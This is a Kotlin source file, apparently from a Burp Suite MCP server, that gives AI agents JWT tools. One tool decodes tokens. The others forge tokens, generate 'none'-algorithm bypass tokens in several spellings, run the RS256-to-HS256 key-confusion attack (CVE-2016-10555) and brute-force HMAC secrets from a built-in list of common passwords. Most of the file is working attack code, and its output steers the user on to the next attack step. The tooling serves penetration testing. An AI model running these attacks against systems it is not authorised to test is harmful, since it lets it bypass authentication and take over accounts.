package net.portswigger.mcp.tools

import io.jsonwebtoken.Jwts
import io.jsonwebtoken.security.Keys
import io.modelcontextprotocol.kotlin.sdk.server.Server
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.jsonObject
import java.security.KeyFactory
import java.security.interfaces.RSAPrivateKey
import java.security.interfaces.RSAPublicKey
import java.security.spec.PKCS8EncodedKeySpec
import java.security.spec.X509EncodedKeySpec
import java.util.Base64
import java.util.Date
import javax.crypto.spec.SecretKeySpec

private val json = Json { ignoreUnknownKeys = true; prettyPrint = true }

/**
 * Register JWT analysis and manipulation tools.
 */
fun Server.registerJwtTools() {

    mcpTool<JwtDecode>(
        "Decode a JWT token and display its header, payload, and signature. " +
        "Does NOT verify the signature - use for analysis only."
    ) {
        val parts = token.trim().split(".")
        if (parts.size != 3) {
            return@mcpTool "Invalid JWT format. Expected 3 parts separated by dots, got ${parts.size}"
        }

        val header = try {
            val decoded = Base64.getUrlDecoder().decode(parts[0])
            val jsonStr = String(decoded, Charsets.UTF_8)
            json.parseToJsonElement(jsonStr).jsonObject
        } catch (e: Exception) {
            return@mcpTool "Failed to decode header: ${e.message}"
        }

        val payload = try {
            val decoded = Base64.getUrlDecoder().decode(parts[1])
            val jsonStr = String(decoded, Charsets.UTF_8)
            json.parseToJsonElement(jsonStr).jsonObject
        } catch (e: Exception) {
            return@mcpTool "Failed to decode payload: ${e.message}"
        }

        buildString {
            appendLine("=== JWT Decoded ===")
            appendLine()
            appendLine("Header:")
            appendLine(json.encodeToString(JsonObject.serializer(), header))
            appendLine()
            appendLine("Payload:")
            appendLine(json.encodeToString(JsonObject.serializer(), payload))
            appendLine()
            appendLine("Signature (base64url):")
            appendLine(parts[2])
            appendLine()

            // Check for common claims
            payload["exp"]?.toString()?.toLongOrNull()?.let { exp ->
                val expDate = Date(exp * 1000)
                val now = Date()
                if (expDate.before(now)) {
                    appendLine("WARNING: Token is EXPIRED (exp: $expDate)")
                } else {
                    appendLine("Token expires: $expDate")
                }
            }

            payload["iat"]?.toString()?.toLongOrNull()?.let { iat ->
                appendLine("Issued at: ${Date(iat * 1000)}")
            }

            payload["nbf"]?.toString()?.toLongOrNull()?.let { nbf ->
                appendLine("Not before: ${Date(nbf * 1000)}")
            }

            // Algorithm analysis
            val alg = header["alg"]?.toString()?.replace("\"", "")
            when {
                alg == "none" -> appendLine("\nWARNING: Algorithm is 'none' - token is unsigned!")
                alg?.startsWith("HS") == true -> appendLine("\nAlgorithm: $alg (symmetric - HMAC)")
                alg?.startsWith("RS") == true -> appendLine("\nAlgorithm: $alg (asymmetric - RSA)")
                alg?.startsWith("ES") == true -> appendLine("\nAlgorithm: $alg (asymmetric - ECDSA)")
                alg?.startsWith("PS") == true -> appendLine("\nAlgorithm: $alg (asymmetric - RSA-PSS)")
            }
        }
    }

    mcpTool<JwtForge>(
        "Create a new JWT token with the specified header, payload, and signing. " +
        "For HMAC algorithms (HS256/384/512), provide a secret. " +
        "For RSA algorithms (RS256/384/512), provide a private key in PEM format."
    ) {
        try {
            val headerJson = json.parseToJsonElement(header).jsonObject
            val payloadJson = json.parseToJsonElement(payload).jsonObject

            val alg = algorithm.uppercase()
            val builder = Jwts.builder()

            // Set header claims
            headerJson.forEach { (key, value) ->
                if (key != "alg" && key != "typ") {
                    builder.header().add(key, value.toString().replace("\"", ""))
                }
            }

            // Set payload claims
            payloadJson.forEach { (key, value) ->
                val strValue = value.toString().replace("\"", "")
                when (key) {
                    "exp" -> builder.expiration(Date(strValue.toLong() * 1000))
                    "iat" -> builder.issuedAt(Date(strValue.toLong() * 1000))
                    "nbf" -> builder.notBefore(Date(strValue.toLong() * 1000))
                    "sub" -> builder.subject(strValue)
                    "iss" -> builder.issuer(strValue)
                    "aud" -> builder.audience().add(strValue)
                    else -> builder.claim(key, strValue)
                }
            }

            // Sign based on algorithm
            val token = when {
                alg.startsWith("HS") -> {
                    if (secret.isNullOrBlank()) {
                        return@mcpTool "HMAC algorithms require a 'secret' parameter"
                    }
                    val key = Keys.hmacShaKeyFor(secret.toByteArray())
                    when (alg) {
                        "HS256" -> builder.signWith(key, Jwts.SIG.HS256).compact()
                        "HS384" -> builder.signWith(key, Jwts.SIG.HS384).compact()
                        "HS512" -> builder.signWith(key, Jwts.SIG.HS512).compact()
                        else -> return@mcpTool "Unsupported HMAC algorithm: $alg"
                    }
                }
                alg.startsWith("RS") -> {
                    if (privateKey.isNullOrBlank()) {
                        return@mcpTool "RSA algorithms require a 'privateKey' parameter (PEM format)"
                    }
                    val key = parseRsaPrivateKey(privateKey)
                    when (alg) {
                        "RS256" -> builder.signWith(key, Jwts.SIG.RS256).compact()
                        "RS384" -> builder.signWith(key, Jwts.SIG.RS384).compact()
                        "RS512" -> builder.signWith(key, Jwts.SIG.RS512).compact()
                        else -> return@mcpTool "Unsupported RSA algorithm: $alg"
                    }
                }
                alg == "NONE" -> {
                    // Create unsigned token
                    val headerB64 = Base64.getUrlEncoder().withoutPadding()
                        .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".toByteArray())
                    val payloadB64 = Base64.getUrlEncoder().withoutPadding()
                        .encodeToString(payload.toByteArray())
                    "$headerB64.$payloadB64."
                }
                else -> return@mcpTool "Unsupported algorithm: $alg. Supported: HS256, HS384, HS512, RS256, RS384, RS512, none"
            }

            buildString {
                appendLine("=== JWT Forged ===")
                appendLine()
                appendLine("Token:")
                appendLine(token)
            }
        } catch (e: Exception) {
            "Error forging JWT: ${e.message}"
        }
    }

    mcpTool<JwtNoneAttack>(
        "Perform the 'none' algorithm attack on a JWT. " +
        "Takes an existing token and re-encodes it with alg:none and empty signature."
    ) {
        val parts = token.trim().split(".")
        if (parts.size != 3) {
            return@mcpTool "Invalid JWT format"
        }

        try {
            // Decode original payload
            val originalPayload = Base64.getUrlDecoder().decode(parts[1])

            // Create new header with alg: none
            val noneHeader = """{"alg":"none","typ":"JWT"}"""

            // Encode
            val headerB64 = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(noneHeader.toByteArray())
            val payloadB64 = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(originalPayload)

            // Try different variations
            val variations = listOf(
                "$headerB64.$payloadB64.",           // Empty signature
                "$headerB64.$payloadB64",            // No trailing dot
                "$headerB64.$payloadB64.e30",        // Empty JSON object signature
            )

            // Also try with different none spellings
            val algVariations = listOf("none", "None", "NONE", "nOnE")
            val allTokens = mutableListOf<String>()

            for (algSpelling in algVariations) {
                val header = """{"alg":"$algSpelling","typ":"JWT"}"""
                val hB64 = Base64.getUrlEncoder().withoutPadding()
                    .encodeToString(header.toByteArray())
                allTokens.add("$hB64.$payloadB64.")
            }

            buildString {
                appendLine("=== None Algorithm Attack ===")
                appendLine()
                appendLine("Original token header/payload preserved, signature stripped.")
                appendLine()
                appendLine("Primary token (alg: none):")
                appendLine(variations[0])
                appendLine()
                appendLine("Alternative spellings (try if first fails):")
                allTokens.forEachIndexed { i, t ->
                    appendLine("${i + 1}. ${algVariations[i]}: ${t.take(60)}...")
                }
                appendLine()
                appendLine("Other variations:")
                appendLine("- No trailing dot: ${variations[1].take(60)}...")
                appendLine("- Empty JSON sig: ${variations[2].take(60)}...")
            }
        } catch (e: Exception) {
            "Error performing none attack: ${e.message}"
        }
    }

    mcpTool<JwtKeyConfusion>(
        "Perform algorithm confusion attack (CVE-2016-10555). " +
        "Re-signs an RS256 token using the public key as an HMAC secret. " +
        "Exploits servers that use the same key variable for both RSA verification and HMAC signing."
    ) {
        val parts = token.trim().split(".")
        if (parts.size != 3) {
            return@mcpTool "Invalid JWT format"
        }

        try {
            // Get original payload
            val payloadBytes = Base64.getUrlDecoder().decode(parts[1])
            val payloadStr = String(payloadBytes, Charsets.UTF_8)

            // Clean up the public key
            val cleanKey = publicKey
                .replace("-----BEGIN PUBLIC KEY-----", "")
                .replace("-----END PUBLIC KEY-----", "")
                .replace("-----BEGIN RSA PUBLIC KEY-----", "")
                .replace("-----END RSA PUBLIC KEY-----", "")
                .replace("\\s".toRegex(), "")

            // Use the raw public key bytes as HMAC secret
            val keyBytes = Base64.getDecoder().decode(cleanKey)

            // Create HS256 header
            val header = """{"alg":"HS256","typ":"JWT"}"""
            val headerB64 = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(header.toByteArray())
            val payloadB64 = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(payloadBytes)

            // Sign with public key as HMAC secret
            val signingInput = "$headerB64.$payloadB64"
            val mac = javax.crypto.Mac.getInstance("HmacSHA256")
            mac.init(SecretKeySpec(keyBytes, "HmacSHA256"))
            val signature = mac.doFinal(signingInput.toByteArray())
            val sigB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(signature)

            val forgedToken = "$headerB64.$payloadB64.$sigB64"

            // Also try with raw PEM content (some implementations use this)
            val pemContent = publicKey.toByteArray()
            mac.init(SecretKeySpec(pemContent, "HmacSHA256"))
            val sig2 = mac.doFinal(signingInput.toByteArray())
            val sig2B64 = Base64.getUrlEncoder().withoutPadding().encodeToString(sig2)
            val forgedToken2 = "$headerB64.$payloadB64.$sig2B64"

            buildString {
                appendLine("=== Algorithm Confusion Attack (RS256 -> HS256) ===")
                appendLine()
                appendLine("Original algorithm: RS256 (asymmetric)")
                appendLine("Attack algorithm: HS256 (symmetric, using public key as secret)")
                appendLine()
                appendLine("Forged token (decoded public key as secret):")
                appendLine(forgedToken)
                appendLine()
                appendLine("Alternative (raw PEM as secret):")
                appendLine(forgedToken2)
                appendLine()
                appendLine("NOTE: This attack works if the server:")
                appendLine("1. Accepts both RS256 and HS256")
                appendLine("2. Uses the same key variable for verification")
                appendLine("3. Trusts the alg header without validation")
            }
        } catch (e: Exception) {
            "Error performing key confusion attack: ${e.message}"
        }
    }

    mcpTool<JwtBruteforce>(
        "Attempt to bruteforce an HMAC-signed JWT using a wordlist. " +
        "Tests common weak secrets to find the signing key."
    ) {
        val parts = token.trim().split(".")
        if (parts.size != 3) {
            return@mcpTool "Invalid JWT format"
        }

        val signingInput = "${parts[0]}.${parts[1]}"
        val expectedSig = parts[2]

        // Default common secrets if none provided
        val secretsToTry = if (wordlist.isNullOrEmpty()) {
            listOf(
                "secret", "password", "123456", "12345678", "qwerty", "abc123",
                "monkey", "1234567", "letmein", "trustno1", "dragon", "baseball",
                "iloveyou", "master", "sunshine", "ashley", "bailey", "shadow",
                "123123", "654321", "superman", "qazwsx", "michael", "football",
                "password1", "password123", "welcome", "jesus", "ninja", "mustang",
                "password1!", "Password1", "P@ssw0rd", "admin", "root", "test",
                "changeme", "default", "guest", "key", "private", "secret123"
            )
        } else {
            wordlist
        }

        var found: String? = null

        for (secret in secretsToTry) {
            try {
                val mac = javax.crypto.Mac.getInstance("HmacSHA256")
                mac.init(SecretKeySpec(secret.toByteArray(), "HmacSHA256"))
                val sig = mac.doFinal(signingInput.toByteArray())
                val sigB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(sig)

                if (sigB64 == expectedSig) {
                    found = secret
                    break
                }
            } catch (e: Exception) {
                // Skip invalid secrets
            }
        }

        if (found != null) {
            buildString {
                appendLine("=== SECRET FOUND! ===")
                appendLine()
                appendLine("Secret: $found")
                appendLine()
                appendLine("You can now forge tokens using jwt_forge with this secret.")
            }
        } else {
            "No matching secret found in wordlist (${secretsToTry.size} secrets tested)"
        }
    }
}

private fun parseRsaPrivateKey(pem: String): RSAPrivateKey {
    val cleaned = pem
        .replace("-----BEGIN PRIVATE KEY-----", "")
        .replace("-----END PRIVATE KEY-----", "")
        .replace("-----BEGIN RSA PRIVATE KEY-----", "")
        .replace("-----END RSA PRIVATE KEY-----", "")
        .replace("\\s".toRegex(), "")

    val keyBytes = Base64.getDecoder().decode(cleaned)
    val keySpec = PKCS8EncodedKeySpec(keyBytes)
    val keyFactory = KeyFactory.getInstance("RSA")
    return keyFactory.generatePrivate(keySpec) as RSAPrivateKey
}

// ============== Data Classes ==============

@Serializable
data class JwtDecode(val token: String)

@Serializable
data class JwtForge(
    val header: String,
    val payload: String,
    val algorithm: String = "HS256",
    val secret: String? = null,
    val privateKey: String? = null
)

@Serializable
data class JwtNoneAttack(val token: String)

@Serializable
data class JwtKeyConfusion(
    val token: String,
    val publicKey: String
)

@Serializable
data class JwtBruteforce(
    val token: String,
    val wordlist: List<String>? = null
)
